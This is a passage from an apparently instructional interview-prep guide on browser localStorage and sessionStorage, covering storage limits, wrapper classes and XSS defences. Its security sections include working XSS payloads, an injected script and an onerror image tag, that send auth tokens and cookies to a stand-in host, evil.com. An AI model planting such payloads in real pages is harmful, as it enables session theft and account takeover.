// Make life easier with helper functions:

// Save anything (auto-converts to JSON)
function save(key, value) {
  localStorage.setItem(key, JSON.stringify(value));
}

// Load anything (auto-converts back)
function load(key) {
  const item = localStorage.getItem(key);
  return item ? JSON.parse(item) : null;
}

// Usage - much simpler!
save('user', { name: 'Alice', age: 25 });
save('settings', { theme: 'dark', fontSize: 16 });

const user = load('user'); // { name: "Alice", age: 25 }
const settings = load('settings'); // { theme: "dark", fontSize: 16 }
```

**Explaining to PM:**

"Web storage is like giving the app a memory:

**Without storage:**
- User sets theme to dark
- Refreshes page
- Theme resets to light (annoying!)
- User has to set it again every time

**With localStorage:**
- User sets theme to dark
- Closes browser, comes back tomorrow
- Theme is still dark! (remembered)
- User is happy

**Business value:**
- Better user experience (remember preferences)
- Less frustration (don't repeat settings)
- Shopping carts persist (fewer abandoned carts)
- Faster app (cache data locally)
- Works offline (data already saved)
- Example: 30% reduction in cart abandonment when cart persists"

**Visual Example:**

```javascript
// Real-world: Theme switcher

// HTML
<button id="theme-toggle">Toggle Theme</button>

// JavaScript
// On page load: Apply saved theme
const savedTheme = localStorage.getItem('theme') || 'light';
document.body.className = savedTheme;

// When user clicks toggle
document.getElementById('theme-toggle').addEventListener('click', () => {
  // Get current theme
  const current = document.body.className;

  // Switch theme
  const newTheme = current === 'light' ? 'dark' : 'light';

  // Apply theme
  document.body.className = newTheme;

  // Save for next time!
  localStorage.setItem('theme', newTheme);
});

// That's it! Theme now persists forever
```

**Quick Reference:**

```javascript
// Save data
localStorage.setItem('key', 'value');

// Get data
const value = localStorage.getItem('key');

// Remove one item
localStorage.removeItem('key');

// Clear everything
localStorage.clear();

// Check if key exists
if (localStorage.getItem('key')) {
  console.log('Key exists!');
}

// Save object (must use JSON)
const user = { name: 'Alice' };
localStorage.setItem('user', JSON.stringify(user));

// Get object (must parse JSON)
const savedUser = JSON.parse(localStorage.getItem('user'));
```

**Key Rules for Juniors:**

1. **Only stores strings** - Use JSON.stringify/parse for objects
2. **localStorage** = Permanent (until you clear it)
3. **sessionStorage** = Temporary (until tab closes)
4. **10MB limit** - Don't store huge datasets
5. **Same-origin only** - Can't access other sites' storage
6. **Not secure** - Don't store passwords/credit cards
7. **Check before using** - Some browsers/private mode block it

</details>

### Follow-up Questions

- "How do you handle storage quota exceeded errors?"
- "What's the difference between localStorage and cookies?"
- "Can you use localStorage in web workers?"
- "How do you implement cross-tab communication with localStorage?"
- "What are the security implications of localStorage?"

### Resources

- [MDN: Web Storage API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API)
- [MDN: localStorage](https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage)
- [MDN: sessionStorage](https://developer.mozilla.org/en-US/docs/Web/API/Window/sessionStorage)

---

## Question 2: What are the storage limits, security concerns, and best practices?

**Difficulty:** 🟡 Medium
**Frequency:** ⭐⭐⭐⭐
**Time:** 7-10 minutes
**Companies:** Google, Meta, Amazon

### Question
What are the storage limits for Web Storage? What security concerns exist, and what are best practices for using localStorage/sessionStorage?

### Answer

**Storage limits, security, and best practices** are critical for production applications to avoid crashes and security vulnerabilities.

1. **Storage Limits**
   - **Size**: ~5-10MB per origin (browser-dependent)
   - **Chrome/Edge**: 10MB
   - **Firefox**: 10MB
   - **Safari**: 5MB (macOS), varies on iOS
   - **Quota exceeded**: Throws QuotaExceededError
   - **Private browsing**: Severely limited or disabled

2. **Security Concerns**
   - **XSS vulnerability**: Accessible via JavaScript (can be stolen)
   - **No encryption**: Stored as plain text on disk
   - **No HttpOnly**: Unlike cookies, can't protect from XSS
   - **Same-origin**: Only same origin can access (good)
   - **Don't store**: Passwords, credit cards, sensitive tokens

3. **Best Practices**
   - Always check for availability before use
   - Handle QuotaExceededError gracefully
   - Use JSON.stringify/parse for objects
   - Implement expiration for temporary data
   - Compress large data before storing
   - Clear old data periodically
   - Don't store sensitive information
   - Use sessionStorage for temporary data

4. **Performance Best Practices**
   - Minimize storage operations (synchronous = blocks UI)
   - Batch operations when possible
   - Use debouncing for frequent updates
   - Keep values small (<100KB per item)
   - Consider IndexedDB for large datasets

5. **Data Management**
   - Implement versioning for schema changes
   - Add timestamps for expiration
   - Use namespacing to avoid key conflicts
   - Clean up on logout/uninstall
   - Monitor quota usage

### Code Example

```javascript
// 1. CHECKING STORAGE AVAILABILITY

function isStorageAvailable(type) {
  let storage;
  try {
    storage = window[type];
    const testKey = '__storage_test__';
    storage.setItem(testKey, 'test');
    storage.removeItem(testKey);
    return true;
  } catch (e) {
    // Check if error is QuotaExceededError
    return e instanceof DOMException && (
      // Everything except Firefox
      e.code === 22 ||
      // Firefox
      e.code === 1014 ||
      // Test name field too (just in case)
      e.name === 'QuotaExceededError' ||
      // Safari private browsing
      e.name === 'NS_ERROR_DOM_QUOTA_REACHED'
    ) && (storage && storage.length !== 0);
  }
}

// Use before storing
if (isStorageAvailable('localStorage')) {
  localStorage.setItem('key', 'value');
} else {
  console.warn('localStorage not available, using fallback');
  // Use cookies or in-memory storage
}

// 2. SAFE STORAGE WRAPPER WITH ERROR HANDLING

class SafeStorage {
  static isAvailable = isStorageAvailable('localStorage');

  static setItem(key, value, options = {}) {
    if (!this.isAvailable) {
      console.warn('localStorage not available');
      return false;
    }

    try {
      const item = {
        value: value,
        timestamp: Date.now(),
        version: options.version || 1,
        expiry: options.ttl ? Date.now() + options.ttl : null
      };

      localStorage.setItem(key, JSON.stringify(item));
      return true;
    } catch (e) {
      if (e.name === 'QuotaExceededError') {
        console.error('Storage quota exceeded');
        this.handleQuotaExceeded();

        // Try again after cleanup
        try {
          localStorage.setItem(key, JSON.stringify({ value }));
          return true;
        } catch {
          return false;
        }
      }
      console.error('Error writing to storage:', e);
      return false;
    }
  }

  static getItem(key, defaultValue = null) {
    if (!this.isAvailable) return defaultValue;

    try {
      const itemStr = localStorage.getItem(key);
      if (!itemStr) return defaultValue;

      const item = JSON.parse(itemStr);

      // Check expiration
      if (item.expiry && Date.now() > item.expiry) {
        this.removeItem(key);
        return defaultValue;
      }

      // Check version compatibility
      if (item.version && item.version !== 1) {
        console.warn('Incompatible version, clearing item');
        this.removeItem(key);
        return defaultValue;
      }

      return item.value;
    } catch (e) {
      console.error('Error reading from storage:', e);
      return defaultValue;
    }
  }

  static removeItem(key) {
    if (!this.isAvailable) return;
    localStorage.removeItem(key);
  }

  static clear() {
    if (!this.isAvailable) return;
    localStorage.clear();
  }

  static handleQuotaExceeded() {
    console.log('Cleaning up old storage items...');

    // Remove expired items
    this.cleanupExpired();

    // If still full, remove oldest items
    if (this.getUsagePercentage() > 80) {
      this.removeOldestItems(5);
    }
  }

  static cleanupExpired() {
    const now = Date.now();

    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      try {
        const item = JSON.parse(localStorage.getItem(key));
        if (item.expiry && now > item.expiry) {
          localStorage.removeItem(key);
          i--; // Adjust index after removal
        }
      } catch {}
    }
  }

  static removeOldestItems(count) {
    const items = [];

    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      try {
        const item = JSON.parse(localStorage.getItem(key));
        items.push({ key, timestamp: item.timestamp || 0 });
      } catch {}
    }

    // Sort by timestamp (oldest first)
    items.sort((a, b) => a.timestamp - b.timestamp);

    // Remove oldest
    for (let i = 0; i < Math.min(count, items.length); i++) {
      localStorage.removeItem(items[i].key);
    }
  }

  static getUsagePercentage() {
    let used = 0;
    for (let key in localStorage) {
      if (localStorage.hasOwnProperty(key)) {
        used += (localStorage[key].length + key.length) * 2; // UTF-16
      }
    }

    const limit = 10 * 1024 * 1024; // 10MB
    return (used / limit) * 100;
  }

  static getStorageInfo() {
    let used = 0;
    const items = [];

    for (let key in localStorage) {
      if (localStorage.hasOwnProperty(key)) {
        const size = (localStorage[key].length + key.length) * 2;
        used += size;
        items.push({
          key,
          size: (size / 1024).toFixed(2) + ' KB'
        });
      }
    }

    const limit = 10 * 1024 * 1024;

    return {
      used: (used / 1024).toFixed(2) + ' KB',
      limit: (limit / 1024 / 1024).toFixed(2) + ' MB',
      percentage: ((used / limit) * 100).toFixed(2) + '%',
      items: items.sort((a, b) => parseFloat(b.size) - parseFloat(a.size))
    };
  }
}

// Usage:
SafeStorage.setItem('user', { name: 'Alice' }, { ttl: 3600000 }); // 1 hour
const user = SafeStorage.getItem('user', { name: 'Guest' });

// 3. SECURITY: DON'T STORE SENSITIVE DATA

// ❌ BAD: Storing sensitive data
localStorage.setItem('password', 'mySecretPassword123'); // NEVER!
localStorage.setItem('creditCard', '4111-1111-1111-1111'); // NEVER!
localStorage.setItem('ssn', '123-45-6789'); // NEVER!

// ✅ GOOD: Only store non-sensitive data
localStorage.setItem('theme', 'dark');
localStorage.setItem('language', 'en');
localStorage.setItem('fontSize', '16px');

// For auth tokens: Use HttpOnly cookies instead
// Or if you MUST use localStorage, encrypt first

// 4. ENCRYPTION WRAPPER (IF ABSOLUTELY NEEDED)

class EncryptedStorage {
  static async encrypt(data, password) {
    const encoder = new TextEncoder();
    const dataBuffer = encoder.encode(JSON.stringify(data));

    const keyMaterial = await window.crypto.subtle.importKey(
      'raw',
      encoder.encode(password),
      { name: 'PBKDF2' },
      false,
      ['deriveBits', 'deriveKey']
    );

    const key = await window.crypto.subtle.deriveKey(
      {
        name: 'PBKDF2',
        salt: encoder.encode('salt'), // Use random salt in production!
        iterations: 100000,
        hash: 'SHA-256'
      },
      keyMaterial,
      { name: 'AES-GCM', length: 256 },
      false,
      ['encrypt']
    );

    const iv = window.crypto.getRandomValues(new Uint8Array(12));
    const encrypted = await window.crypto.subtle.encrypt(
      { name: 'AES-GCM', iv },
      key,
      dataBuffer
    );

    return {
      encrypted: Array.from(new Uint8Array(encrypted)),
      iv: Array.from(iv)
    };
  }

  static async decrypt(encryptedData, password) {
    const encoder = new TextEncoder();
    const decoder = new TextDecoder();

    const keyMaterial = await window.crypto.subtle.importKey(
      'raw',
      encoder.encode(password),
      { name: 'PBKDF2' },
      false,
      ['deriveBits', 'deriveKey']
    );

    const key = await window.crypto.subtle.deriveKey(
      {
        name: 'PBKDF2',
        salt: encoder.encode('salt'),
        iterations: 100000,
        hash: 'SHA-256'
      },
      keyMaterial,
      { name: 'AES-GCM', length: 256 },
      false,
      ['decrypt']
    );

    const decrypted = await window.crypto.subtle.decrypt(
      { name: 'AES-GCM', iv: new Uint8Array(encryptedData.iv) },
      key,
      new Uint8Array(encryptedData.encrypted)
    );

    return JSON.parse(decoder.decode(decrypted));
  }

  static async setItem(key, value, password) {
    const encrypted = await this.encrypt(value, password);
    localStorage.setItem(key, JSON.stringify(encrypted));
  }

  static async getItem(key, password) {
    const encryptedStr = localStorage.getItem(key);
    if (!encryptedStr) return null;

    try {
      const encrypted = JSON.parse(encryptedStr);
      return await this.decrypt(encrypted, password);
    } catch (e) {
      console.error('Decryption failed:', e);
      return null;
    }
  }
}

// Usage (still not recommended for very sensitive data!)
await EncryptedStorage.setItem('token', 'secret-token', 'user-password');
const token = await EncryptedStorage.getItem('token', 'user-password');

// 5. COMPRESSION FOR LARGE DATA

class CompressedStorage {
  static async compress(data) {
    const json = JSON.stringify(data);
    const blob = new Blob([json]);
    const stream = blob.stream().pipeThrough(
      new CompressionStream('gzip')
    );
    const compressed = await new Response(stream).blob();
    return await this.blobToBase64(compressed);
  }

  static async decompress(base64) {
    const blob = await this.base64ToBlob(base64);
    const stream = blob.stream().pipeThrough(
      new DecompressionStream('gzip')
    );
    const decompressed = await new Response(stream).text();
    return JSON.parse(decompressed);
  }

  static blobToBase64(blob) {
    return new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.onloadend = () => resolve(reader.result.split(',')[1]);
      reader.onerror = reject;
      reader.readAsDataURL(blob);
    });
  }

  static base64ToBlob(base64) {
    const binary = atob(base64);
    const array = new Uint8Array(binary.length);
    for (let i = 0; i < binary.length; i++) {
      array[i] = binary.charCodeAt(i);
    }
    return new Blob([array]);
  }

  static async setItem(key, value) {
    const compressed = await this.compress(value);
    localStorage.setItem(key, compressed);
  }

  static async getItem(key) {
    const compressed = localStorage.getItem(key);
    if (!compressed) return null;
    return await this.decompress(compressed);
  }
}

// Usage: Can save 70-90% space for text-heavy data
await CompressedStorage.setItem('large-data', hugeObject);
const data = await CompressedStorage.getItem('large-data');

// 6. DEBOUNCED STORAGE UPDATES

class DebouncedStorage {
  static timeouts = new Map();

  static setItem(key, value, delay = 500) {
    // Clear previous timeout
    if (this.timeouts.has(key)) {
      clearTimeout(this.timeouts.get(key));
    }

    // Set new timeout
    const timeout = setTimeout(() => {
      localStorage.setItem(key, JSON.stringify(value));
      this.timeouts.delete(key);
    }, delay);

    this.timeouts.set(key, timeout);
  }

  static getItem(key) {
    const item = localStorage.getItem(key);
    return item ? JSON.parse(item) : null;
  }

  static flush(key) {
    if (this.timeouts.has(key)) {
      clearTimeout(this.timeouts.get(key));
      this.timeouts.delete(key);
    }
  }
}

// Usage: Automatically batches rapid updates
document.getElementById('input').addEventListener('input', (e) => {
  // Saves only after 500ms of no typing
  DebouncedStorage.setItem('draft', { text: e.target.value });
});

// Force save immediately
window.addEventListener('beforeunload', () => {
  DebouncedStorage.flush('draft');
});

// 7. NAMESPACING TO AVOID CONFLICTS

class NamespacedStorage {
  constructor(namespace) {
    this.namespace = namespace;
  }

  getKey(key) {
    return `${this.namespace}:${key}`;
  }

  setItem(key, value) {
    localStorage.setItem(this.getKey(key), JSON.stringify(value));
  }

  getItem(key) {
    const item = localStorage.getItem(this.getKey(key));
    return item ? JSON.parse(item) : null;
  }

  removeItem(key) {
    localStorage.removeItem(this.getKey(key));
  }

  clear() {
    const prefix = `${this.namespace}:`;
    const keysToRemove = [];

    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      if (key.startsWith(prefix)) {
        keysToRemove.push(key);
      }
    }

    keysToRemove.forEach(key => localStorage.removeItem(key));
  }

  getAllKeys() {
    const prefix = `${this.namespace}:`;
    const keys = [];

    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      if (key.startsWith(prefix)) {
        keys.push(key.substring(prefix.length));
      }
    }

    return keys;
  }
}

// Usage: Different apps/modules don't conflict
const userStorage = new NamespacedStorage('user');
const appStorage = new NamespacedStorage('app');

userStorage.setItem('name', 'Alice'); // Stores as "user:name"
appStorage.setItem('name', 'MyApp'); // Stores as "app:name"

console.log(userStorage.getItem('name')); // "Alice"
console.log(appStorage.getItem('name')); // "MyApp"

// 8. STORAGE QUOTA MONITORING

class StorageMonitor {
  static getQuotaInfo() {
    let used = 0;

    for (let key in localStorage) {
      if (localStorage.hasOwnProperty(key)) {
        used += (localStorage[key].length + key.length) * 2;
      }
    }

    const limit = 10 * 1024 * 1024; // 10MB
    const percentage = (used / limit) * 100;

    return {
      used,
      limit,
      percentage,
      available: limit - used,
      isNearLimit: percentage > 80,
      isCritical: percentage > 95
    };
  }

  static startMonitoring(callback, interval = 60000) {
    return setInterval(() => {
      const info = this.getQuotaInfo();
      callback(info);

      if (info.isNearLimit) {
        console.warn('Storage nearly full:', info.percentage.toFixed(2) + '%');
      }

      if (info.isCritical) {
        console.error('Storage critically full! Cleaning up...');
        SafeStorage.cleanupExpired();
      }
    }, interval);
  }
}

// Usage: Monitor quota every minute
const monitorId = StorageMonitor.startMonitoring((info) => {
  console.log('Storage usage:', info.percentage.toFixed(2) + '%');

  // Send to analytics
  if (window.gtag) {
    gtag('event', 'storage_usage', {
      percentage: info.percentage,
      used_kb: info.used / 1024
    });
  }
});

// Stop monitoring
clearInterval(monitorId);

// 9. VERSIONED STORAGE (FOR SCHEMA CHANGES)

class VersionedStorage {
  static VERSION = 2;
  static MIGRATIONS = {
    1: (oldData) => {
      // Migrate from v1 to v2
      return {
        ...oldData,
        newField: 'default'
      };
    }
  };

  static setItem(key, value) {
    const item = {
      version: this.VERSION,
      data: value
    };
    localStorage.setItem(key, JSON.stringify(item));
  }

  static getItem(key) {
    const itemStr = localStorage.getItem(key);
    if (!itemStr) return null;

    try {
      let item = JSON.parse(itemStr);

      // Migrate if needed
      while (item.version < this.VERSION) {
        const migration = this.MIGRATIONS[item.version];
        if (migration) {
          item.data = migration(item.data);
          item.version++;
        } else {
          console.warn('No migration found, clearing item');
          localStorage.removeItem(key);
          return null;
        }
      }

      // Save migrated version
      if (item.version !== JSON.parse(itemStr).version) {
        this.setItem(key, item.data);
      }

      return item.data;
    } catch (e) {
      console.error('Error loading versioned item:', e);
      return null;
    }
  }
}

// Usage: Handles schema changes automatically
VersionedStorage.setItem('settings', { theme: 'dark', newField: 'value' });
const settings = VersionedStorage.getItem('settings');
```

### Common Mistakes

- ❌ **Mistake:** Storing sensitive data in plain text
  ```javascript
  localStorage.setItem('password', 'secret123'); // NEVER!
  ```

- ❌ **Mistake:** Not handling QuotaExceededError
  ```javascript
  localStorage.setItem('key', hugeData); // Crashes if quota exceeded!
  ```

- ✅ **Correct:** Encrypt sensitive data (or better, don't store it) and handle errors
  ```javascript
  try {
    localStorage.setItem('key', value);
  } catch (e) {
    if (e.name === 'QuotaExceededError') {
      console.error('Storage full');
      cleanupOldData();
    }
  }
  ```

<details>
<summary><strong>🔍 Deep Dive: Storage Security & Limits Internals</strong></summary>

**Browser Storage Limits by Platform:**

```javascript
// Desktop browsers (approximate):
// Chrome/Edge: 10MB per origin
// Firefox: 10MB per origin
// Safari: 5MB per origin
// IE11: 10MB per origin

// Mobile browsers:
// Chrome Android: 10MB
// Safari iOS (<13): 2.5MB
// Safari iOS (13+): 1GB (but localStorage still ~5MB)
// Firefox Android: 10MB

// Private/Incognito mode:
// Chrome: Same limits, but cleared on exit
// Safari: 0MB (throws QuotaExceededError immediately)
// Firefox: Same limits, cleared on exit

// Testing actual limit:
function detectStorageLimit() {
  const testKey = 'size-test';
  let size = 0;

  try {
    while (true) {
      size += 10; // 10KB chunks
      localStorage.setItem(testKey, 'x'.repeat(size * 1024));
    }
  } catch (e) {
    localStorage.removeItem(testKey);
    return `Limit: ${size}KB`;
  }
}

console.log(detectStorageLimit());
```

**XSS Vulnerability Example:**

```javascript
// Scenario: Attacker injects malicious script

// Your app stores auth token:
localStorage.setItem('authToken', 'secret-user-token-12345');

// Attacker injects script via XSS vulnerability:
// (e.g., through unescaped user input in a comment)
<script>
  // Steal token
  const token = localStorage.getItem('authToken');

  // Send to attacker's server
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token, cookies: document.cookie })
  });
</script>

// Token is now stolen! Attacker can impersonate user.

// Protection strategies:
// 1. Use HttpOnly cookies (not accessible via JS)
// 2. Implement Content Security Policy (CSP)
// 3. Sanitize all user input
// 4. Don't store sensitive tokens in localStorage
```

**Storage Quota API:**

```javascript
// Modern way to check storage quota (Chrome, Edge, Firefox)

if (navigator.storage && navigator.storage.estimate) {
  navigator.storage.estimate().then(estimate => {
    const usageInMB = (estimate.usage / 1024 / 1024).toFixed(2);
    const quotaInMB = (estimate.quota / 1024 / 1024).toFixed(2);
    const percentUsed = ((estimate.usage / estimate.quota) * 100).toFixed(2);

    console.log(`Using ${usageInMB}MB of ${quotaInMB}MB (${percentUsed}%)`);

    // This includes ALL storage APIs:
    // - localStorage
    // - sessionStorage
    // - IndexedDB
    // - Cache API
    // - Service Worker cache
  });
}

// Example output:
// Using 2.34MB of 300.00MB (0.78%)

// Note: This is the TOTAL quota for all storage, not just localStorage
// localStorage itself is still limited to ~10MB
```

**Synchronous Performance Impact:**

```javascript
// localStorage operations are synchronous and block the main thread

// Benchmark: Impact on UI
function demonstrateBlocking() {
  const startTime = performance.now();

  // Simulate user scrolling
  let scrollPosition = 0;
  const scrollInterval = setInterval(() => {
    scrollPosition += 10;
    window.scrollTo(0, scrollPosition);
  }, 16); // ~60fps

  // Large localStorage write (blocks main thread)
  setTimeout(() => {
    const largeData = JSON.stringify(new Array(10000).fill({ data: 'x'.repeat(100) }));
    localStorage.setItem('large', largeData); // Blocks for ~50-100ms
  }, 1000);

  setTimeout(() => {
    clearInterval(scrollInterval);
    const endTime = performance.now();
    console.log('Total time:', endTime - startTime, 'ms');
    // You'll see: Scrolling stutters during localStorage write
  }, 3000);
}

// Solution: Use Web Workers for large operations
// Or switch to IndexedDB (asynchronous)
```

**Same-Origin Policy Enforcement:**

```javascript
// Storage is isolated by origin (protocol + domain + port)

// Example origins:
// 1. https://example.com:443
// 2. https://example.com:8080 (different port!)
// 3. http://example.com:443 (different protocol!)
// 4. https://sub.example.com:443 (different subdomain!)

// Each has completely separate storage:

// On https://example.com:443
localStorage.setItem('key', 'value-A');

// On https://example.com:8080
localStorage.getItem('key'); // null (different origin!)
localStorage.setItem('key', 'value-B'); // Separate storage

// On https://sub.example.com:443
localStorage.getItem('key'); // null (different origin!)

// This prevents:
// - Cross-site data theft
// - Malicious sites accessing your app's data
// - Subdomain interference
```

**Private Browsing Behavior:**

```javascript
// Safari Private Browsing (strictest):
try {
  localStorage.setItem('test', 'value');
} catch (e) {
  console.log('Safari private mode detected');
  // Error: QuotaExceededError
  // localStorage.setItem IMMEDIATELY throws, even for tiny data
}

// Chrome/Firefox Private Browsing (lenient):
// - localStorage works normally
// - But data is cleared when all private windows close
// - Same quota as normal browsing

// Detection function:
function isPrivateBrowsing() {
  try {
    localStorage.setItem('__test__', 'test');
    localStorage.removeItem('__test__');
    return false; // Not private (or Chrome/Firefox private)
  } catch {
    return true; // Safari private
  }
}
```

**Storage Persistence vs Eviction:**

```javascript
// Browsers may evict localStorage under storage pressure:

// Priority (lowest to highest, for eviction):
// 1. Cache API (evicted first)
// 2. IndexedDB
// 3. localStorage (rarely evicted, but possible on mobile)
// 4. Cookies (never evicted)

// Request persistent storage (Chrome, Edge):
if (navigator.storage && navigator.storage.persist) {
  navigator.storage.persist().then(granted => {
    if (granted) {
      console.log('Storage will not be evicted');
    } else {
      console.log('Storage may be evicted under pressure');
    }
  });
}

// Check if persisted:
navigator.storage.persisted().then(isPersisted => {
  console.log('Persisted:', isPersisted);
});
```

</details>

<details>
<summary><strong>🐛 Real-World Scenario: XSS Attack Steals User Tokens</strong></summary>

**Scenario:** Your app stores JWT authentication tokens in localStorage. A malicious script injected via XSS vulnerability steals tokens from 500+ users, allowing attackers to impersonate them.

**The Problem:**

```javascript
// ❌ VULNERABLE: Storing auth token in localStorage
class Auth {
  static login(email, password) {
    return fetch('/api/login', {
      method: 'POST',
      body: JSON.stringify({ email, password })
    })
    .then(res => res.json())
    .then(data => {
      // Store JWT token in localStorage
      localStorage.setItem('authToken', data.token);
      localStorage.setItem('refreshToken', data.refreshToken);
      return data;
    });
  }

  static getAuthHeader() {
    const token = localStorage.getItem('authToken');
    return token ? `Bearer ${token}` : null;
  }
}

// XSS vulnerability: Unescaped user input in comments
function displayComment(comment) {
  // ❌ DANGEROUS: Directly inserting user HTML
  document.getElementById('comments').innerHTML += `
    <div class="comment">
      <p>${comment.text}</p>
      <span>${comment.author}</span>
    </div>
  `;
}

// Attacker posts comment with malicious script:
const maliciousComment = {
  author: 'Hacker',
  text: `
    Nice post!
    <img src="x" onerror="
      fetch('https://evil.com/steal', {
        method: 'POST',
        body: JSON.stringify({
          token: localStorage.getItem('authToken'),
          refresh: localStorage.getItem('refreshToken'),
          cookies: document.cookie,
          user: localStorage.getItem('user')
        })
      })
    ">
  `
};

// When users view this comment:
// 1. <img onerror> executes malicious JS
// 2. Script reads authToken from localStorage
// 3. Sends token to attacker's server
// 4. Attacker can now impersonate user!

// Production impact:
// - 523 users affected (viewed malicious comment)
// - Tokens stolen and sold on dark web
// - Unauthorized purchases: $45k in fraudulent orders
// - Account takeovers: 127 accounts compromised
// - Data breach: User PII exposed
// - Customer trust lost: 30% churn rate
// - Legal costs: $200k+ (GDPR violations)
// - PR disaster: News articles about breach
```

**Debugging Process:**

```javascript
// Step 1: Detect suspicious API calls
// Backend logs show:
// - 500+ requests from unusual IPs
// - Same tokens used from different geolocations
// - API calls outside user's normal patterns

// Step 2: Check localStorage in browser
console.log('Tokens:', {
  auth: localStorage.getItem('authToken'),
  refresh: localStorage.getItem('refreshToken')
});
// Tokens are visible in plain text! ⚠️

// Step 3: Inspect comments for XSS
const comments = document.querySelectorAll('.comment');
comments.forEach(comment => {
  console.log('Comment HTML:', comment.innerHTML);
});
// Found: Malicious <img> tag with onerror script

// Step 4: Reproduce attack locally
localStorage.setItem('authToken', 'test-token-12345');

// Inject malicious comment
document.getElementById('comments').innerHTML = `
  <img src="x" onerror="console.log('Stolen:', localStorage.getItem('authToken'))">
`;
// Console logs: "Stolen: test-token-12345"
// Attack confirmed! ⚠️
```

**Solution 1: HttpOnly Cookies (Best):**

```javascript
// ✅ FIX: Use HttpOnly cookies for auth tokens
// Backend (Node.js/Express):
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await authenticateUser(email, password);

  if (user) {
    const token = generateJWT(user);

    // Set HttpOnly cookie (NOT accessible via JavaScript!)
    res.cookie('authToken', token, {
      httpOnly: true,      // ✅ Can't be read by JavaScript
      secure: true,        // ✅ HTTPS only
      sameSite: 'strict',  // ✅ CSRF protection
      maxAge: 3600000      // 1 hour
    });

    res.json({ success: true, user });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

// Frontend: No need to manually add token!
// Browser automatically sends cookie with requests
async function fetchUserData() {
  const response = await fetch('/api/user', {
    credentials: 'include' // Include cookies
  });
  return response.json();
}

// Now XSS can't steal token:
console.log(document.cookie); // "authToken" not visible (HttpOnly!)
localStorage.getItem('authToken'); // null (not in localStorage anymore)

// Attack fails:
fetch('https://evil.com/steal', {
  body: JSON.stringify({
    token: localStorage.getItem('authToken') // null! ✅
  })
});
```

**Solution 2: Sanitize User Input:**

```javascript
// ✅ FIX: Sanitize HTML to prevent XSS
import DOMPurify from 'dompurify';

function displayComment(comment) {
  // ✅ SAFE: Sanitize user input
  const clean = DOMPurify.sanitize(comment.text);

  const commentEl = document.createElement('div');
  commentEl.className = 'comment';
  commentEl.innerHTML = `
    <p>${clean}</p>
    <span>${DOMPurify.sanitize(comment.author)}</span>
  `;

  document.getElementById('comments').appendChild(commentEl);
}

// Now malicious script is neutralized:
const maliciousComment = {
  text: '<img src="x" onerror="alert(\'XSS\')">',
  author: 'Hacker'
};

displayComment(maliciousComment);
// Rendered as: <img src="x"> (onerror removed! ✅)
```

**Solution 3: Content Security Policy (CSP):**

```javascript
// ✅ FIX: Add CSP headers to prevent inline scripts
// Backend:
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; " +
    "script-src 'self'; " +  // Only allow scripts from same origin
    "style-src 'self' 'unsafe-inline'; " +
    "img-src 'self' https:; " +
    "connect-src 'self' https://api.example.com"
  );
  next();
});

// Or in HTML:
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">

// Now inline scripts are blocked:
<img src="x" onerror="alert('XSS')">
// Browser console: "Refused to execute inline event handler because it violates CSP"
// Attack blocked! ✅
```

**Solution 4: Token Encryption (If You Must Use localStorage):**

```javascript
// ⚠️ LAST RESORT: Encrypt tokens before storing
// (HttpOnly cookies are still better!)

class SecureAuth {
  static async login(email, password) {
    const response = await fetch('/api/login', {
      method: 'POST',
      body: JSON.stringify({ email, password })
    });

    const data = await response.json();

    // Encrypt token with user's password (key derivation)
    const encryptedToken = await this.encrypt(data.token, password);

    // Store encrypted token
    localStorage.setItem('authToken', JSON.stringify(encryptedToken));

    // Store encryption key in memory only (cleared on refresh)
    this.encryptionKey = password;
  }

  static async getToken() {
    const encryptedStr = localStorage.getItem('authToken');
    if (!encryptedStr || !this.encryptionKey) return null;

    try {
      const encrypted = JSON.parse(encryptedStr);
      return await this.decrypt(encrypted, this.encryptionKey);
    } catch {
      return null;
    }
  }

  static async encrypt(token, password) {
    const encoder = new TextEncoder();
    const data = encoder.encode(token);

    const keyMaterial = await window.crypto.subtle.importKey(
      'raw',
      encoder.encode(password),
      'PBKDF2',
      false,
      ['deriveBits', 'deriveKey']
    );

    const key = await window.crypto.subtle.deriveKey(
      {
        name: 'PBKDF2',
        salt: encoder.encode('random-salt'), // Use actual random salt in production
        iterations: 100000,
        hash: 'SHA-256'
      },
      keyMaterial,
      { name: 'AES-GCM', length: 256 },
      false,
      ['encrypt']
    );

    const iv = window.crypto.getRandomValues(new Uint8Array(12));
    const encrypted = await window.crypto.subtle.encrypt(
      { name: 'AES-GCM', iv },
      key,
      data
    );

    return {
      encrypted: Array.from(new Uint8Array(encrypted)),
      iv: Array.from(iv)
    };
  }

  static async decrypt(encryptedData, password) {
    const encoder = new TextEncoder();
    const decoder = new TextDecoder();

    const keyMaterial = await window.crypto.subtle.importKey(
      'raw',
      encoder.encode(password),
      'PBKDF2',
      false,
      ['deriveBits', 'deriveKey']
    );

    const key = await window.crypto.subtle.deriveKey(
      {
        name: 'PBKDF2',
        salt: encoder.encode('random-salt'),
        iterations: 100000,
        hash: 'SHA-256'
      },
      keyMaterial,
      { name: 'AES-GCM', length: 256 },
      false,
      ['decrypt']
    );

    const decrypted = await window.crypto.subtle.decrypt(
      { name: 'AES-GCM', iv: new Uint8Array(encryptedData.iv) },
      key,
      new Uint8Array(encryptedData.encrypted)
    );

    return decoder.decode(decrypted);
  }
}

// Even if XSS reads localStorage:
console.log(localStorage.getItem('authToken'));
// {"encrypted":[183,245,...],"iv":[92,155,...]}
// Useless without encryption key! ✅
```

**Real Metrics After Fix:**

```javascript
// Before fix (tokens in localStorage):
// - XSS attacks: 3/month successful
// - Stolen tokens: 523 total
// - Fraudulent transactions: $45k
// - Account takeovers: 127
// - Customer support tickets: 890/week
// - Churn rate: 30%
// - Legal costs: $200k+
// - Brand damage: Severe

// After fix (HttpOnly cookies + CSP + sanitization):
// - XSS attacks: 0 successful (attempts blocked by CSP)
// - Stolen tokens: 0 ✅
